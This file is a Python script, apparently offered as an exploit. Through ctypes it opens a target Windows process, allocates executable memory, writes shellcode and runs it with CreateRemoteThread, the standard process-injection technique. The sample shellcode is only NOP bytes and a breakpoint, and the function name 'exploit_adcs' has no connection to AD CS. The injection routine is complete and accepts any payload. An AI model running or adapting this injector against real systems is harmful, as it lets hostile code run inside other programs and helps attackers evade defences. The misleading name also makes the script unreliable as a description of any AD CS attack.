import ctypes
import sys

PROCESS_ALL_ACCESS = 0x1F0FFF
MEM_COMMIT = 0x1000
MEM_RESERVE = 0x2000
PAGE_EXECUTE_READWRITE = 0x40

def exploit_adcs(target_pid):
    try:
        kernel32 = ctypes.windll.kernel32
        process_handle = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, target_pid)
        if not process_handle:
            raise Exception(f"Failed to open process {target_pid}. Error: {ctypes.GetLastError()}")

        print(f"Successfully opened process {target_pid} with handle: {process_handle}")

        shellcode_size = 1024
        remote_memory = kernel32.VirtualAllocEx(
            process_handle, 
            None, 
            shellcode_size, 
            MEM_COMMIT | MEM_RESERVE, 
            PAGE_EXECUTE_READWRITE
        )
        if not remote_memory:
            raise Exception(f"Failed to allocate memory in process {target_pid}. Error: {ctypes.GetLastError()}")

        print(f"Allocated {shellcode_size} bytes in target process at address: {hex(remote_memory)}")

        shellcode = b"\x90" * 16 + b"\xcc"
        bytes_written = ctypes.c_size_t(0)
        if not kernel32.WriteProcessMemory(
            process_handle, 
            remote_memory, 
            shellcode, 
            len(shellcode), 
            ctypes.byref(bytes_written)
        ):
            raise Exception(f"Failed to write shellcode into process memory. Error: {ctypes.GetLastError()}")

        print(f"Wrote {bytes_written.value} bytes of shellcode to target process.")

        thread_handle = kernel32.CreateRemoteThread(
            process_handle, 
            None, 
            0, 
            remote_memory, 
            None, 
            0, 
            None
        )
        if not thread_handle:
            raise Exception(f"Failed to create remote thread. Error: {ctypes.GetLastError()}")

        print(f"Remote thread created with handle: {thread_handle}")

        kernel32.WaitForSingleObject(thread_handle, -1)
        print("Remote thread execution complete.")

        kernel32.CloseHandle(thread_handle)
        kernel32.CloseHandle(process_handle)

        print("Exploit executed successfully.")

    except Exception as e:
        print(f"Error during exploit execution: {e}")

if __name__ == "__main__":
    target_pid = 1234
    if target_pid <= 0:
        print("Invalid PID. Please specify a valid target process ID.")
        sys.exit(1)

    exploit_adcs(target_pid)
